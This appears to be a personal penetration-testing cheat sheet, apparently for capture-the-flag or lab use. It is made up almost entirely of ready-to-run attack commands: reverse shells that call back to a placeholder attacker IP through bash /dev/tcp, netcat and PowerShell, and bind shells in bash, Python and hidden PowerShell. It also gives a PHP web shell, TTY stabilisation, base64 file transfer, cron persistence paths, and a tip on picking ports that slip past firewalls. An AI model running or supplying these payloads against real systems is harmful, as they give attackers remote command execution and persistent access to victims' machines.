Listener On Attacker
```bash
nc -lnvp <port_number>
```

Note:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Reverse Shell on Victim
```css
Linux
bash -c 'bash -i >& /dev/tcp/Attacker_IP/Attacker_port 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip attacker_port >/tmp/f

Windows
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Bind Shell on Victim
```css
Bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f


Python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

Powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

Updating TTY
```css
Note:
Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

python -c 'import pty; pty.spawn("/bin/bash")'
or
python3 -c 'import pty; pty.spawn("/bin/bash")'

Ctrl +z to Background
$stty raw -echo
$fg
Enter
Enter

On Attacker Machine
$echo $TERM
xterm-256color

$stty size
67 318

On Victim Machine
$export TERM=xterm-256color
$stty row 67 columns 318

On attacker machine, type `stty -a`. Note down the value of rows and columns. On target machine
$stty rows <number>
$stty cols <number>
```


### Default Web Root
* Apache - /var/www/html/
* Nginx - /usr/local/nginx/html/
* IIS - c:\inetpub\wwwroot\
* XAMPP -  	C:\xampp\htdocs\

```
PHP
<?php system($_REQUEST["cmd"]); ?>

Accessing WebShell
curl http://SERVER_IP:PORT/shell.php?cmd=id

PHP Reverse Shell File
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php
```


### Priv Escalation
```
https://book.hacktricks.xyz/

Linux
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

Windows
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

https://github.com/swisskyrepo/PayloadsAllTheThings
```


### Enumeration Script
```
Linux
https://github.com/rebootuser/LinEnum.git
https://github.com/sleventyeleven/linuxprivchecker

Windows
https://github.com/GhostPack/Seatbelt
https://github.com/411Hall/JAWS

Linux & Windows
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

Linux
https://gtfobins.github.io/

Windows
https://lolbas-project.github.io/#
```

### Cron
```
The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:

1./etc/crontab
2./etc/cron.d
3./var/spool/cron/crontabs/root
```


### Transfer File
```
Attacker 
$base64 file -w 0

Victim
$echo base64_from_above | base64 -d > file

Verify on both machine
$md5sum
```


```
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with 
$sudo apt install rlwrap

Reverse Shell
When connecting to windows through NC, we use the following command

$sudo rlwrap nc -lvnp <port_number>
Example:
$sudo nc -lnvp 443
(It's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.)


Bind Shell
If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it.

$nc <target_IP> <chosen_port>
```

